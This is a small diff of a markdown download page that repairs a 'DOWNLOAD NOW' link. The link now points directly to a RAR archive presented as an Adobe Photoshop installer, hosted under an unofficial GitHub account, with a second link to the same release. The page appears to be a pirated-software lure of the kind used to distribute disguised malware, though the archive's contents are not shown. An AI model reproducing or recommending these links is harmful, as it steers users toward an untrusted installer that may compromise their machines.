@@ -8,7 +8,7 @@
 
 
 
-[DOWNLOAD NOW](https://github.com/SOFTONIAX/photoshopinstaller/releases/tag/photoshop](https://github.com/SOFTONIAX/photoshopinstaller/releases/download/photoshop/AdobePhotoshopInstaller.rar)
+[DOWNLOAD NOW](https://github.com/SOFTONIAX/photoshopinstaller/releases/download/photoshop/AdobePhotoshopInstaller.rar)
 -
 [DOWNLOAD NOW](https://github.com/SOFTONIAX/photoshopinstaller/releases/tag/photoshop)
 -
